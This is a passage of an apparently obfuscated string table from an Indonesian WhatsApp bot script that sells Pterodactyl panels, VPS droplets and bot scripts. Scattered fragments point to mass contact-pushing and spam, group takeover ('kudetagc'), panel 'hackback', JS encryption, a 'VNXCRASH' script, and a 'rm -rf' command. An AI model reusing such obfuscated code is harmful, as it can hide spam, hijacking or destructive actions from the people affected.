        'groupParti',
        'ʟɪsᴛᴊᴘᴍ\x0a│\x20',
        'DnnpB',
        'sAhNt',
        'nowatermar',
        'yCnEW',
        'KtBVl',
        'sᴛ\x20ғʀɪᴇɴᴅs',
        '#22b4f2',
        'OqzQT',
        'lLjEu',
        'erver_\x20.\x20.',
        '.buysc\x201',
        'BHmgr',
        'HnTRu',
        'PWIwV',
        'text',
        'emblokir\x20@',
        'startwings',
        'PjkrR',
        'RIbIm',
        'listadmin',
        't3.zip',
        'apatkan\x20in',
        'PomDc',
        '&amount=',
        'amount',
        '\x20ᴅʜɪʟᴢ\x20<\x20ʙ',
        'ADoqK',
        'up\x20',
        'ler!',
        'XZvoR',
        'response',
        'Cpqgm',
        'ses\x20✅*\x0a\x0a*B',
        'Public',
        'B\x20:\x20Rp1000',
        'yaran\x20tela',
        'BFioY',
        'ʟ\x0a│\x20↝\x20.ɪɴs',
        'sᴛ\x0a│\x20↝\x20.ɢɪ',
        'GgxvN',
        'VERSION:3.',
        'CnxTb',
        'dana',
        'lTixK',
        'n\x0a*\x20Garans',
        'FMDjd',
        'ZAfqd',
        'UHJIz',
        'sHHOr',
        'hasil\x20bot\x20',
        'pk\x20:*\x20',
        'asal\x20hapus',
        'hackbackpa',
        'imum\x20disk\x20',
        'ᴘᴏʀᴛ\x20>\x0a│\x20↝',
        'ThDyq',
        'jpm*\x20di\x20gr',
        'e)\x0a*\x20Claim',
        'rDgqk',
        'afrns',
        'encrypt\x20co',
        'telah\x20meny',
        'p\x20yang\x20ber',
        'uote/gener',
        'ykSCj',
        'yYhOH',
        '\x0a│\x20↝\x20.ᴜɴʟɪ',
        'textpushko',
        'ᴀʟʟᴇʀ\x20ᴍᴇɴᴜ',
        '309530oSmSDp',
        'toaudio',
        'bteTq',
        'ɪ\x20ᴊɪᴋᴀ\x20sᴄ\x20',
        'IygFv',
        'ser\x20(to\x20sk',
        'CYDOm',
        'fOjmq',
        'r4c2',
        'ᴄʜ\x0a│\x20↝\x20.ᴜᴘ',
        'EJbtb',
        's\x20of\x20Servi',
        '\x0a*\x20*Member',
        '22299494\x0a\x0a',
        '.buypanel\x20',
        'VsGNN',
        'Simple-Bot',
        'xuxVd',
        'ZzSnH',
        'name',
        ',\x0a│\x20↝\x20ʙᴏᴛɴ',
        'hai',
        'logo\x20whats',
        'OBRpM',
        'ovUPk',
        's\x20Yang\x20Ter',
        'angUl',
        'Error!\x20rep',
        'tohd',
        'owneroffmo',
        'Proceed\x20an',
        '569@s.what',
        'uninstallt',
        'File\x20konta',
        '𝗿𝗲\x20MENYEDI',
        '25000',
        'CPU\x2040%',
        'nzCSs',
        '\x20Panel\x20Pte',
        '12000',
        'listdrople',
        'dUeOx',
        'UMsur',
        'ruhend-scr',
        'text/plain',
        'ʀᴛ\x20>\x0a│\x20↝\x20ᴀ',
        'ytmp4',
        'vpyqy',
        'shift',
        'HSram',
        'vhGwG',
        'ink\x20by\x20tin',
        'FhrdM',
        'sai',
        '\x20*.batalbe',
        'PS:\x20',
        '\x20dalam\x20pri',
        'get',
        'ipt\x20bot',
        'ik\x20mungkin',
        'menu',
        'seller\x20✅',
        'teksnya\x20de',
        'EwBFy',
        'ctyl-insta',
        '0|2|3',
        'rt\x20VPS\x20ber',
        'kti\x20transa',
        'limits',
        'engirim\x20pe',
        'quNxC',
        'bbMcF',
        'coeVu',
        '━━━━━━━━\x0a\x0a',
        '.me/628562',
        'DgcmQ',
        'videoMessa',
        't\x20Bot\x20What',
        '\x20antilink\x20',
        'QZMCB',
        'kSmFw',
        'BKoFr',
        '\x0a│\x20↝\x20.ᴄʟᴇᴀ',
        'ᴀʏᴠɪᴅ\x20\x0a│\x20↝',
        'Rp4000',
        'gEggV',
        'Ladtu',
        'PANEL\x206GB',
        'TcQxB',
        '*\x20_Claim\x20g',
        '/channel/',
        'DOcLa',
        '8gb\x20',
        'Rp6000',
        'DaMbR',
        'tdImz',
        'joinchanne',
        't\x20to\x20autom',
        'IyMZP',
        'cvps',
        '5|3|6|1|4|',
        '│\x20↝\x20.ʙʀᴀᴛ\x0a',
        'eSEft',
        'OMUqX',
        'jphNR',
        '*\x0a┃*\x20CPU\x20:',
        'us\x20pembaya',
        'pushName',
        '=>\x20{\x20',
        'le\x20kontak\x20',
        'fyggT',
        'XchCX',
        'iFKHg',
        'KJmAB',
        '.ᴅᴇʟᴘᴀɴᴇʟ-',
        './session',
        '4gb-v2',
        'self',
        'lu\x20gunakan',
        'ya!',
        'ᴀᴅʀᴏᴘʟᴇᴛ\x0a│',
        '1gb\x20',
        'VZSIL',
        '\x20Member',
        'oSubK',
        'aling)_\x0a*\x20',
        'MtxDA',
        '*jpmslide\x20',
        'n\x20atau\x20dro',
        'bqkrb',
        '747048XrVugm',
        'ʟᴏᴡɴᴇʀ\x0a│\x20↝',
        'metadata',
        'nbBoa',
        'all',
        'eloper,\x20te',
        'cDpgG',
        'grup\x20ini\x20t',
        'sWArI',
        'wmAtq',
        'mbelian\x205\x20',
        'dalah\x20foto',
        'ʀ\x0a│\x20↝\x20.ʟɪs',
        'message',
        'avtaY',
        'tBHMh',
        'wnerbot\x20te',
        'BYcHK',
        'distributi',
        '\x20.ʟɪsᴛsᴇʟʟ',
        'status@bro',
        'ssh2',
        'ositori\x20ti',
        '\x0a*📦\x20Beriku',
        '\x20MariaDB\x20d',
        'vers',
        'Last\x20name\x20',
        'eInvite',
        'ixRYo',
        'URJzU',
        'btUtA',
        'bisa\x20di\x20da',
        '*\x0a*\x20Disk\x20:',
        '𝖪\x20𝖦𝖡\x0a>\x20𝖯𝖤𝖱',
        'List\x20Grup\x20',
        'pJueU',
        'et\x20yang\x20da',
        'dj\x20tiktok',
        'wSwwS',
        'sCuDc',
        '/sampah/',
        'dmjTJ',
        'Asia/Jakar',
        'udah\x20Di\x20Bu',
        'vnWXA',
        'ntak',
        'jpmtesti',
        'ᴇʟʀᴇsᴘᴏɴ\x0a│',
        'UUgOn',
        'kPCdq',
        'okDNO',
        'yOnGu',
        '\x20private\x20&',
        'listowner',
        'jqwfZ',
        'pYkxk',
        '𝗲\x20MENYEDIA',
        'i\x20kirim\x20ke',
        'NXlse',
        'alah\x20list\x20',
        'PCFVg',
        'zzst*\x0a',
        'mediafire.',
        'ah\x20Satu\x20Ad',
        '\x20||\x20CPU\x20',
        'RAM\x205GB\x20|\x20',
        '.ᴜɴɪɴsᴛᴀʟʟ',
        '*_Telegram',
        'Encrypt\x20Fi',
        'ver*\x0a┏*\x20Ra',
        'mIhCD',
        'NIQWN',
        'Script\x20bot',
        'BmEtK',
        'del',
        'ini',
        '55000',
        'Link\x20tauta',
        'ulgAh',
        'igdl',
        ')*\x20\x0a*➡︎\x20Use',
        'u\x204',
        'BWRYh',
        'droplet_li',
        'CKhrV',
        'PANEL\x205GB',
        '\x20Simpel',
        'MBZwn',
        'Ram\x209GB',
        'ULHQs',
        '7gb-v2',
        'k_hd',
        'BfCsA',
        'iWStQ',
        'jdGNz',
        'DPOAF',
        'result',
        'zone_name',
        'atsapp',
        'uUlAA',
        'press\x20\x27c\x27\x20',
        'hFvyT',
        'KYoZm',
        '\x20:\x20*',
        'vers/',
        '\x20for\x20the\x20i',
        'osit',
        'EhoOA',
        'imageMessa',
        'ʜ\x20sᴡᴛ\x20<\x20ɢᴏ',
        'xADGn',
        'listp',
        'XbFyP',
        'akunpanel.',
        'Header',
        'image/png',
        'delowner',
        '.r2c2\x20',
        'base64',
        '\x20replace)_',
        'SHOPEPAY\x20',
        '.ɪɴsᴛᴀɢʀᴀᴍ',
        '-ᴠ2\x20\x0a│\x20↝\x20.',
        '.delpanel',
        'i\x20tidak\x20ak',
        'RAM\x20∞\x20|\x20CP',
        'dVbkr',
        'al\x20Cpu\x20:*\x20',
        'GsGBv',
        'sendMessag',
        'KnaeK',
        'sage',
        'unhandledR',
        'GllUY',
        '/eggs/',
        'RVcnu',
        'mimetype',
        'wner\x20✅',
        'lVqtv',
        'eller!',
        'RAM\x207GB\x20|\x20',
        '𝖠𝖸\x0a>\x20𝖬𝖠𝖲𝖴𝖪',
        '\x20.ᴘᴜʙʟɪᴄ\x0a│',
        '*\x0a\x0a*CONTAC',
        '\x20.ʀᴇsᴇᴛʟɪɴ',
        'UvTQa',
        'ceZrz',
        '*\x0a*\x20Ram\x20:\x20',
        '*\x20sampah\x20s',
        'Message',
        'YOaRF',
        'ian\x0a',
        'namaOwner',
        'isDevelope',
        'okasi:\x20',
        'spon*\x20untu',
        '\x20grup',
        'gpfwj',
        'JwzSi',
        'FppXC',
        'veLZx',
        'gpt',
        'UMzUo',
        'ᴘᴜsʜᴋᴏɴᴛᴀᴋ',
        '𝗽𝗽\x20𝗘𝘃𝗼𝘂𝗿𝘁𝗵',
        '1000',
        'oVhrd',
        'parse',
        'on\x20',
        'admin',
        'ontacts.vc',
        'USD',
        '.r1c1\x20',
        'an\x0a\x20*•\x20Exp',
        'ect',
        'pScvb',
        'gQtSv',
        'png',
        'in\x20Yang\x20Te',
        '\x0a│\x20↝\x20.ʟɪsᴛ',
        '2|3|1|4|5|',
        '𝗿𝘁𝗵\x20𝗖𝗽𝗮𝗻𝗲𝗹',
        '\x20Root\x0aIP:\x20',
        'tovn',
        'FxnwC',
        'admin\x20pane',
        'ematikan\x20*',
        'ᴍᴏᴛᴇ\x0a│\x20↝\x20.',
        'dengan\x20rep',
        'APbNJ',
        'io\x20maksima',
        'ghcr.io/pa',
        'VCYya',
        'sBvGv',
        'ᴠ2\x0a┗━━━━━━',
        '7000',
        'YGgwP',
        '.buypanel',
        'ngUpdate',
        'svGki',
        'PANEL\x201GB',
        '/channel/0',
        'NFcpP',
        'le\x20JS\x20Suks',
        'Self',
        'OmAkl',
        'sbOXd',
        'autopromos',
        'tsApp\x22,\x22ur',
        'Initial\x20co',
        'alse',
        'dRloD',
        'ah\x20aktif!',
        'RuiET',
        'tXKnS',
        'in\x20account',
        'mqIQw',
        'tyl*\x0a',
        'u\x20do\x20not\x20k',
        '\x20𝗘𝘃𝗼𝘂𝗿𝘁𝗵\x20-',
        '8gb',
        'xaFtL',
        'WJlOh',
        'Rebuild\x20VP',
        'hzGZp',
        'vcpus',
        'mVXDC',
        'sTnIG',
        'tourl2',
        '\x20↝\x20.ᴄʟᴇᴀʀᴄ',
        'nel',
        '121592BrSHiZ',
        '\x205\x20menit,\x20',
        'n\x0a│*\x20Simpa',
        '\x20tidak\x20dit',
        'Jmvkv',
        'admin@gmai',
        'includes',
        'btjWR',
        'UIlvF',
        'Interactiv',
        'api-create',
        'jAcDz',
        'tial\x20admin',
        '.r4c2\x20',
        'orKGP',
        '©\x20𝗘𝘃𝗼𝘂𝗿𝘁𝗵\x20',
        '.buyvps\x203',
        'CuUiK',
        'tomatis\x20me',
        'hQEjR',
        'DAKfK',
        'hMZPE',
        'ᴛɪᴋᴛᴏᴋᴍᴘ3\x0a',
        'KhuTh',
        'up\x20ini\x20sud',
        'ywkDA',
        'QsJve',
        '7gb',
        '\x20↝\x20.ɪɴsᴛᴀʟ',
        'ovo',
        'NLxBN',
        'i.simplebo',
        'delpanel-v',
        'sSBDX',
        'Ram\x202\x20&\x20Cp',
        'mited\x20:\x20Rp',
        'bot\x20dijami',
        'Terbuka',
        'bTKvN',
        'tXQcu',
        '\x20Adalah\x20𝗥𝘆',
        'erhasil\x20bo',
        'CtoQg',
        'ZpoXd',
        'lVsHe',
        'up\x20Terdete',
        'ets:\x20',
        'Ryqul',
        '5\x20menit\x20pe',
        'ᴇsᴇᴛᴅʙ\x0a│\x20↝',
        'jpmslideht',
        'ksi_',
        'sғɪʟᴇ\x0a┗━━━',
        '↝\x20.6ɢʙ-ᴠ2\x0a',
        'iABtp',
        '_Garansi\x201',
        'qKWrw',
        'ni\x20:*\x0a',
        'mcoYE',
        'capcut',
        '8000',
        '3|1|0|2|4',
        'enc',
        'I\x20dan\x20sela',
        'SCpQn',
        'vers?page=',
        'atsapp.com',
        'Ram\x203GB',
        'ired\x20akun\x20',
        'Pilih\x20Sala',
        'stiker',
        '</>\x20𝗪𝗵𝗮𝘁𝘀𝗔',
        'BZnMG',
        'ini\x20sudah\x20',
        'snSET',
        'ezone\x20[Eur',
        'iVRCH',
        'ᴅᴍɪɴ\x0a┗━━━━',
        'FITcN',
        '*mute*\x20di\x20',
        'owner',
        'scraper',
        '\x20.ᴊᴘᴍ\x0a│\x20↝\x20',
        '\x20berhasil\x20',
        'systemctl\x20',
        'PIgnq',
        'AoPVC',
        '✅*\x0aData\x20ak',
        'public',
        'https://mo',
        'Wings\x20Di\x20N',
        '↝\x20.ᴘᴀʏᴍᴇɴᴛ',
        'OLIts',
        'uUPqn',
        'fpbLH',
        'ooaFV',
        'Binary',
        'EZvxG',
        'Mlbvh',
        'dak\x20valid',
        'ng\x20*Offlin',
        'EOKqx',
        'oIeeo',
        'ar\x20Dari\x20Gr',
        'Rp5.000',
        'package-lo',
        '.deladmin',
        's-2vcpu-4g',
        'invite',
        'wSiEM',
        'IbiCV',
        'OOaCj',
        'cfonts',
        'qScrY',
        '\x20WhatsApp',
        '┃GB',
        'selectedBu',
        'Miczs',
        'SEqDM',
        '\x20\x20ʙᴏᴛ\x20\x20━━━',
        'o\x20skip\x20don',
        'eamanan\x20be',
        '│\x20↝\x20.ʙʀᴀᴛᴠ',
        'sifnS',
        '\x0a⏰\x20',
        'hCdGX',
        '@whiskeyso',
        'anel\x0aTungg',
        'xcdMZ',
        '\x20Server)',
        '5000\x0a\x0a*\x20Ra',
        'addown',
        'T\x20TO\x20BUY??',
        'tMbTG',
        'kXIqr',
        'Masukkan\x20n',
        'pGhlc',
        'ɴɢғᴀᴋᴇ\x0a│\x20↝',
        'panel\x20addr',
        'iGPYH',
        'Select\x20the',
        'TFraz',
        'ALwum',
        'drive',
        '\x0a*\x20*Status',
        'tsmjt',
        'YjFLO',
        '3|0|2|1|4',
        'ASI\x20CLOUDF',
        'map',
        'membuat\x20pa',
        'AnBHd',
        'girim\x20foto',
        'status',
        'oPRpS',
        'ZEBNg',
        'XnRTm',
        'RvvFM',
        'qyHuJ',
        'zhirZ',
        'CarouselMe',
        'LaIRy',
        'Server\x20Bot',
        'ID:\x20',
        'u:\x20',
        '.ovo',
        'lpCpF',
        'rDzJi',
        'ʏᴀᴋ\x0a\x0a*sᴄ\x20ɪ',
        'Hasil\x20penc',
        '*Welcome*\x20',
        'KtKRG',
        '*Berhasil\x20',
        '\x0a*\x20*Pembua',
        '\x0a\x20\x20\x20\x20*[\x20Re',
        'aqtuH',
        'xGcZK',
        'GMHmE',
        '://pteroda',
        'fig\x0apasswo',
        'ɢᴘᴛ\x0a│\x20↝\x20.ᴛ',
        'unt',
        'IXTiA',
        'delayPushk',
        'jpmslide',
        'el\x20📦*\x0a\x0a*📡\x20',
        'jadi\x20resel',
        'udah\x20aktif',
        'XoJMG',
        'joinch',
        '@gmail.com',
        'BAoyB',
        'jpZKu',
        'imoni\x20Ke\x20',
        'jpmslidehi',
        'excUD',
        'U\x20∞%\x20',
        'TbHoy',
        'LqPJr',
        'unlimited-',
        'il\x20data\x20dr',
        '│\x20↝\x20ᴀʟʟᴀʜ\x20',
        'm_*:\x20https',
        '↝\x20.ᴡᴇʟᴄᴏᴍᴇ',
        ',\x20sᴀʏᴀ\x20ᴀᴅᴀ',
        'find',
        '\x20Spam\x20Chat',
        'ema\x20billin',
        'ontacts.js',
        'UjKOi',
        'sxXUE',
        'nUKOQ',
        'ttonId',
        'ereset\x20dat',
        'harga',
        'images_url',
        'hNTgZ',
        'kmCTa',
        'yang\x20belum',
        'tKvuH',
        'Logger:\x20',
        'list',
        '-ᴠ2\x0a│\x20↝\x20.4',
        'Masukkan\x20L',
        'ajib\x20memba',
        'app.com',
        '\x201\x20bulan\x0a*',
        'lks:nodejs',
        '.ᴜɴʟɪᴍɪᴛᴇᴅ',
        'aransi\x20waj',
        'Edmbk',
        'xcnBl',
        'Singapore\x0a',
        'openai',
        'Menu',
        'sapp.net',
        'bnUNu',
        '\x20membawa\x20b',
        'YInSZ',
        'uk\x20melihat',
        'n\x20:*\x0a*\x20Exp',
        'wpJxQ',
        'ᴍᴇɴɢᴇᴛᴀʜᴜɪ',
        'bAKuZ',
        'icPPD',
        '\x20:\x20',
        'e\x20dalam\x20gr',
        'aktif!',
        'LCqyi',
        'TTPS\x20using',
        'rst',
        'noOQG',
        'AFqmy',
        'WQETP',
        'd\x20the\x20Term',
        'xtMessage',
        'Script\x20Pus',
        'ata',
        'WkWkM',
        'VvMXR',
        'semua\x20𝗘𝘃𝗼𝘂',
        'jYxQs',
        'r16c4',
        '*\x20sampah\x20f',
        'kIskD',
        '*\x20di\x20grup\x20',
        'tYlhH',
        '99999',
        'participan',
        '\x20Panel',
        '\x20SC\x20VNXCRA',
        'Rp10.000',
        'om/st/?api',
        'picture',
        'LOgia',
        '\x27s\x20Encrypt',
        'IgJYX',
        '[\x20PESAN\x20EV',
        'Please\x20rea',
        'translate',
        'JvjeZ',
        'ope/Stockh',
        'MUPli',
        'wfneD',
        'wpOPV',
        'DQvyF',
        'EKjzo',
        '.php?url=',
        'sgAhg',
        'lElbj',
        '\x0aMaaf\x20Owne',
        '*autoreads',
        'mXPXm',
        'Hapus\x20Serv',
        'ZTJsR',
        'u\x20📦*\x0a\x0a*➡︎\x20I',
        '\x20\x20\x0a┏━━━━━\x20',
        'bot\x20akan\x20o',
        'node-uploa',
        'EIYnf',
        'PCfjX',
        'k\x20berhasil',
        'HdiLw',
        'at\x20mengamb',
        'HIKvW',
        'domainV2',
        'enyalakan\x20',
        'ᴀᴘᴄᴜᴛ\x0a│\x20↝\x20',
        'yiBvp',
        'ivate\x20chat',
        'wITso',
        '&\x20foto*\x20ke',
        'ATION\x20SERV',
        'n\x20transaks',
        '✅*\x0a*',
        'm|node.com',
        'membersihk',
        'Hapus\x20Admi',
        'TPS\x20reques',
        'DlHfO',
        'DHkLT',
        'groupFetch',
        'kan',
        'gBphF',
        'YUbQA',
        'jEjZQ',
        '7|5|3|4|6|',
        'Error\x20fetc',
        'ᴇᴛᴀɢ\x0a│\x20↝\x20.',
        '\x20sudah\x20men',
        '\x0a*\x20*Tag\x20:*',
        'namaSalura',
        'rd\x20:*\x20',
        'listadmin-',
        'rCtFG',
        'Z*\x0a\x0a*•\x20Res',
        'ngan\x20mengi',
        'proses',
        'uota',
        'amanan\x20ber',
        'Rp45.000',
        'Ram\x206GB',
        'NXJqK',
        'he\x20panel\x20d',
        'oplet\x20terp',
        'remainingD',
        'ᴇɴᴄʜᴀʀᴅ\x0a┗━',
        'pp.net',
        '│\x20↝\x20.ᴄᴀᴅᴍɪ',
        'FbUUi',
        'groupAccep',
        'wa\x20bukti\x20c',
        'wlJVJ',
        'yCDXB',
        'XoqKh',
        'GfWdK',
        'biling',
        'NLtwY',
        'mungkin\x0a*\x20',
        'open',
        '*\x20untuk\x20me',
        'anime\x20dark',
        'inspect',
        'ᴏᴡɴᴇʀ`\x20━━━',
        'SDldS',
        'qzYlE',
        'ESkMG',
        'bFfCI',
        'ip\x20don\x27t\x20i',
        'lPZto',
        'Rp3000',
        'iKuTY',
        'uvMYA',
        'foccu',
        'd/ytmp3?ur',
        '\x0a\x20*#-\x20List',
        'KjudA',
        'glHTv',
        '0𝖪\x0a>\x20𝖬𝖴𝖱𝖡𝖴',
        'RppOJ',
        'ctReply',
        'tuk\x20membat',
        'pino',
        'yl\x0a',
        'ckets/bail',
        'IP\x20VPS:\x20',
        'aqKhm',
        'RtGoN',
        '\x0aPilih\x20Sal',
        'ᴄᴋʙᴀᴄᴋᴘᴀɴᴇ',
        'stderr',
        'oken\x20if\x20yo',
        'bYpCa',
        'dSaveMedia',
        'dengan\x20men',
        '&codeqr=',
        'jGCHl',
        '\x20Ketika\x20Ow',
        'n\x20aman\x20(an',
        'Gagal\x20memb',
        'hidetag*\x20K',
        '\x20panel\x20tid',
        'music_info',
        'batalbeli',
        'itemukan',
        'l\x20Run\x20Bot\x20',
        'fromMe',
        '14kLWdxn',
        'Rp55.000',
        'kudetagc',
        'SHOPEEPAY',
        '\x20&\x20foto\x20Ke',
        'Gagal\x20mela',
        '\x0a*\x20',
        'done',
        'wfsiK',
        'gvNza',
        'Password\x20(',
        '\x20\x0a│\x20↝\x20.ʜɪᴅ',
        'video',
        '\x0a\x0a*\x20Ram\x202\x20',
        'nnel\x20whats',
        'T\x20ME*\x0a\x0a*_W',
        'EaSjw',
        'qoZZU',
        'settings',
        '.domain\x20',
        '\x20Let\x27s\x20Enc',
        '9999999999',
        'jKGhd',
        'bil\x20Token\x20',
        'bHyYc',
        'yrYGU',
        '.owner',
        'ɴɪ\x20ғʀᴇᴇ\x20ᴅᴀ',
        'Berhasil\x20*',
        'RTYoZ',
        '5gb',
        'tallation?',
        'SEtDg',
        'promote',
        'ggVuQ',
        '\x20panel\x20suk',
        'fFHDU',
        'ʙ-ᴠ2\x20\x0a│\x20↝\x20',
        '0|1|6|2',
        '\x20menghapus',
        'ownload:*\x20',
        '.sᴛɪᴄᴋᴇʀ\x0a┗',
        'RvCyg',
        'R\x20ON\x2024JAM',
        '\x20semua\x20men',
        'GPAfA',
        'BXoCn',
        'enigma',
        'panel',
        'oto\x22,\x22url\x22',
        'MTWVD',
        '18357810a9',
        'string',
        'el\x20\x0aTunggu',
        '\x20:*\x20',
        'odWyi',
        'VfQMz',
        'g\x20:*\x20Vps\x20D',
        'PEmEd',
        'gitclone',
        'ᴀɴᴛɪʟɪɴᴋ2\x0a',
        'L\x20DITERIMA',
        '━━━━\x20`ᴅɪɢɪ',
        'linkgcnya',
        'si*\x20tidak\x20',
        '\x20(y/N)',
        '\x0a│\x20↝\x20.ᴅᴇʟᴘ',
        'rWMyp',
        'type',
        'aper',
        'ᴜᴛᴜʜᴀɴ\x20ᴘᴀɴ',
        'mMYnE',
        'IgFSW',
        'OjMqn',
        'atically\x20c',
        '\x20Server',
        'ᴛᴜ\x20sᴀʏᴀ\x20ᴊᴜ',
        'sa\x20Dibawah',
        'w*\x20tidak\x20a',
        's|domain',
        'cCGFK',
        'Pilih\x20Pake',
        'ess\x20(blank',
        'NuHaJ',
        'yes\x0a',
        'ᴀsᴛᴇʟʟᴀʀ\x0a│',
        'HylFQ',
        'et\x20Grup\x20Pu',
        'yl*\x0a',
        'nmcWx',
        'JTwgL',
        '│\x20↝\x20.ᴄʟᴏsᴇ',
        'wUUWx',
        '6gb',
        'cOifU',
        '\x20ke\x20privat',
        'rjWHU',
        '\x20-\x20',
        'I\x20agree\x20th',
        'kyzopedia\x20',
        's\x20aksi:\x20',
        'WMEZB',
        'oqdvv',
        '*\x0a\x0a*\x20*Nomo',
        'startsWith',
        '\x0a\x0a┏━━━━━\x20`',
        'cpu',
        '/main/inst',
        'LJaMk',
        'me\x20SSL?\x20(y',
        '5000',
        'onWhatsApp',
        '11000',
        'ᴘʟᴇᴛ\x0a│\x20↝\x20.',
        'Claim\x20gara',
        'rim\x20pesan\x20',
        'xKNEO',
        'ᴛᴏ`\x20\x20━━━━━',
        'JeKCm',
        'd.\x20Continu',
        'oqsuU',
        'ecUzp',
        'm\x206\x20GB\x20:\x20R',
        'Berhasil\x20U',
        'WkByU',
        'VkCFf',
        '\x0a*\x20*Verifi',
        'MtaRo',
        'ilSBU',
        'quote',
        'UhHlu',
        '\x0a*\x20Jangan\x20',
        'OUfPk',
        'ᴢɪsʜᴇʀᴇ\x20<\x20',
        'resolve',
        '\x20*乂\x20List\x20a',
        '𝖫𝖠𝖸\x0a>\x20𝖬𝖠𝖲𝖴',
        'node-os-ut',
        'gs*\x20ipvps|',
        'h\x20expired!',
        'Encrypt',
        'admin\x20acco',
        '\x0a*Hackback',
        'ᴍᴇɴᴜ\x20ᴏᴡɴᴇʀ',
        'VNZlA',
        'ver\x20:*\x20',
        '7gb\x20',
        'SC\x20VNXCRAS',
        'OSxFZ',
        'group',
        '\x0a┗*🔐\x20Passw',
        'ᴄ\x0a│\x20↝\x20.ǫᴄ\x0a',
        'rOocu',
        'D\x20Server\x20(',
        'iGcJc',
        'kti\x20transf',
        'zqsaN',
        'zip\x20-r\x20',
        'rebuild',
        'huYbl',
        'pembuatan\x20',
        'Ram\x204GB',
        'Database\x20u',
        'https://ti',
        '\x20tema\x20pter',
        'bot',
        'un\x20sudah\x20d',
        'high',
        'uuid',
        '.buysc',
        'ou\x20are\x20doi',
        'Email\x20addr',
        'ytmp3',
        '*Antilink*',
        'WQdGF',
        'MANnZ',
        'CkpSN',
        'WhatsApp\x20B',
        'iKLWl',
        'GOPAY\x20',
        'fer\x20demi\x20k',
        'zcrty',
        'u\x202',
        'u\x201',
        'cation/nes',
        'RUhwt',
        'okVwz',
        'kKQJm',
        'yz01234567',
        '\x20Pterodact',
        'lPKKE',
        'er\x20panel*\x0a',
        '\x20anti\x20dela',
        'yrnqV',
        'TEL;type=C',
        'Pilih\x20Grup',
        'terbaik!_\x0a',
        'HszNr',
        'gLFmD',
        'ini\x20pesan\x20',
        'hubusercon',
        '*Tiktok\x20Do',
        'lKBaf',
        'ᴅᴅᴏᴡɴᴇʀ\x0a│\x20',
        'addrespon',
        'Database\x20h',
        't1.zip',
        'zSnoV',
        'engeluarka',
        'Still\x20assu',
        'WMSmm',
        'pan\x20data\x20i',
        'fJFfl',
        '\x20ʙᴜʙᴜʙ\x20>\x0a│',
        'Berhasil\x20b',
        'xt=',
        'set',
        'altgK',
        'YtQgn',
        '\x20Claim\x20gar',
        'd/capcut?u',
        '\x205\x20GB\x20:\x20Rp',
        'engganti\x20f',
        'TlWuq',
        'bkLDJ',
        'skyzoo|ips',
        'us\x20droplet',
        'image/jpeg',
        '\x0a│\x20↝\x20.sᴛɪᴄ',
        'Ram\x20',
        'idch',
        'QnhEp',
        'at\x20Oleh\x20Bo',
        'bukti```\x0a',
        '\x20𝖣𝖠𝖭\x20𝖭𝖮\x20𝖣𝖤',
        'v2\x20',
        'Udawr',
        'adqJI',
        '/ownerbot\x20',
        'tqOtl',
        'clearsessi',
        '3|0|4|2|5|',
        'MCgAN',
        'gimage?q=',
        'atus\x20pemba',
        '89@#%^&*',
        'ZvVMX',
        'gital\x20ocea',
        'yadeD',
        'ng)?\x20(y/N)',
        'fSyDx',
        'mwoWE',
        'ᴀɴ\x20ᴋᴇɴᴏɴ',
        '\x20Offline\x0a',
        'pyKbc',
        'YUQKY',
        's-1vcpu-1g',
        'MfiJk',
        'QvhAd',
        'xmlformats',
        'ᴇɴᴜ`\x20━━━━━',
        '.ᴅᴇʟᴀᴅᴍɪɴ\x0a',
        'produk\x0a',
        'ikpbq',
        'instagram',
        'Encrypt\x20fi',
        'Metadata',
        'jBQNt',
        'Case\x20*',
        'ema',
        'eYkNY',
        'imagess',
        'r2c1',
        'hTMAa',
        'wvBXY',
        'mAtLu',
        'OskOz',
        'pwvps',
        'Sudah\x20Kelu',
        'CArFf',
        '\x20\x0a│\x20↝\x20.10ɢ',
        'gvSmJ',
        '\x20Core\x0a*•\x20R',
        '↝\x20.ᴀᴜᴛᴏᴛʏᴘ',
        'Transaksi\x20',
        'KLJYz',
        'singleSele',
        'Ownerbot',
        'GraBE',
        'mtsAC',
        'gMPsU',
        'diMEn',
        'SnbRa',
        'IBBsl',
        '4000',
        'totalGb',
        'hvSsS',
        'ibmwK',
        '0|1|3|4|2',
        'TsyVn',
        '\x20↝\x20.ᴀᴅᴅʀᴇs',
        'clearchat',
        'gb-amd',
        'node_modul',
        '220',
        'Disk\x20:*\x20',
        'lGHzo',
        '\x20ᴀɴᴅᴀ\x20ᴍᴇᴍʙ',
        '\x20:*\x0aketik\x20',
        'AfIvc',
        'Enter\x20emai',
        'member\x20ber',
        'JbNFw',
        'Batalkan\x20P',
        'san\x20*teks\x20',
        'ᴏᴘᴇʀ*\x0a\x0a┏━━',
        'dak\x20ditemu',
        'BnRXj',
        'ikasi\x20stat',
        'YVGzB',
        'unblock',
        'WveIk',
        'PIVww',
        'odactyl\x20ha',
        'ord\x20Vps\x20Ti',
        'ZvLHz',
        'eCode',
        'tInvite',
        'u\x20📦*\x0a\x0a┏*📡\x20',
        'rm\x20-rf\x20',
        'rup\x20Ini',
        '\x20```Wajib\x20',
        'nel\x201\x20bula',
        'neyblink.c',
        'ggTLo',
        'Ram\x2010GB',
        '\x0a\x20\x20*乂\x20List',
        '\x20&\x20Ketentu',
        'i\x20error\x20pa',
        'status_dep',
        'ist.json',
        'facbh',
        'ku\x20dalam\x205',
        'shkontak\x0a',
        'up\x20ini',
        'ck.json',
        'unggu\x201-10',
        'bwTev',
        'lcdFo',
        'Masukkan\x20R',
        'Akun\x20admin',
        'https://ch',
        'ni\x20sebaik\x20',
        'ᴜᴀᴛ\x20ᴘᴀɴᴇʟ\x20',
        'Hanya\x20Admi',
        'cmd\x0a\x0a\x20keti',
        '\x20.sᴇʟғ\x0a│\x20↝',
        'https://te',
        'clsesi',
        'AMjBu',
        'YqYbq',
        'dxHHQ',
        '\x20.js',
        'List\x20Ram\x20S',
        '\x20By\x20',
        'LeSDG',
        'IjRPX',
        'ync',
        'cpanel',
        'pkika',
        'eolrV',
        'OPGaq',
        'dDugz',
        '\x20✅*\x0a\x0a\x20*•\x20I',
        'wuUcA',
        'Snpmp',
        '\x0a│\x20↝\x20.ᴘʀᴏᴅ',
        'ed\x20:*\x20',
        'euLYi',
        'lf*',
        'PoOCW',
        'QbLFo',
        'cJCiY',
        'IDR',
        'FhrZj',
        'mCJaS',
        'arang\x20Kamu',
        '━━\x0a│\x20↝\x20ʀʏᴢ',
        'views',
        'cekidch',
        'jJrdP',
        'autoread*',
        '(A)gree/(C',
        '\x20𝟦\x20𝖩𝖠𝖣𝖨\x20𝖩𝖠',
        'ukti\x20trans',
        'LpFjG',
        'YsaMS',
